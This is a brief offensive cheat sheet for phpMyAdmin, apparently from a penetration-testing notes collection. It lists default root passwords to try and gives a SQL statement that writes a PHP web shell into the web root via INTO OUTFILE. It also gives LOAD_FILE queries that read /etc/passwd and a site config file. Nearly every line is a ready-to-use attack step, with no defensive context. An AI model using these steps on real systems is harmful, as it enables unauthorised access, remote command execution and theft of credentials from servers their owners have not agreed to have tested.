# phpMyAdmin

### Try default credentials

Common defaults and empty passwords — Often left misconfigured

```bash
# root: (empty)
# root:root
# root:password
# root:toor
# Check version: http://$IP/phpmyadmin/README
```

---

### Write a web shell via SQL

INTO OUTFILE to write PHP shell — Requires FILE privilege

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

### Read files via SQL

LOAD_FILE to read system files — Requires FILE privilege

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

---
